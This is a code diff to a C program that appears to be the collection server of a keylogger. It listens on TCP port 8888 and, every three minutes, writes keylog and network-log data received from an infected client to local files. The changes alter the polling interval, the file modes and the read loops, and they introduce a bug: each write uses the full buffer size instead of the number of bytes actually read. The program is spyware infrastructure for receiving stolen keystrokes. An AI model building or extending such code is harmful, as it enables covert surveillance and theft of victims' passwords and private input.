@@ -6,12 +6,19 @@
 #include <unistd.h>       // write
 #include <fcntl.h>
 
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/select.h>
+#include <sys/stat.h>
+
 #define BUFFER_SIZE 4096
 
 int main()
 {
     // Variables
-    int ssock, csock, addrlen, read_size;
+    int ssock, csock, addrlen;
     struct sockaddr_in server, client;
     char rec_buffer[BUFFER_SIZE];
     short port = 8888;  //TCP port
@@ -56,30 +63,24 @@ int main()
     
     /*** Reading from Client and writing to local files* ***/
     while(1){
-        sleep(178); //wait for the client to execute again
+        sleep(180); //wait for the client to execute again
         memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
         /*Open keylog files for printing*/
-        FILE *keylog_log = fopen("log/keylog_received.txt", "a");
+        FILE *keylog_log = fopen("log/keylog_received.txt", "w");
         /*Receive a keylog file from the client*/
-        if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
+        while(read(csock, rec_buffer, sizeof(rec_buffer)) >0 ) {
             fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), keylog_log);
-        } else {
-            perror("Error receiving keylog log\n");
-            close(csock);
-            close(ssock);
         }
         fclose(keylog_log);
-        
         memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
+        sleep(5);
+        
+
         /*Open network log file for printing*/
-        FILE *network_log = fopen("log/network_received.txt", "a");
+        FILE *network_log = fopen("log/network_received.txt", "w");
         /*Receive network log file*/
-        if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
+        while(read(csock, rec_buffer, sizeof(rec_buffer)) >0 )  {
             fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), network_log);
-        } else {
-            perror("Error receiving network log\n");
-            close(csock);
-            close(ssock);
         }
         fclose(network_log);
         
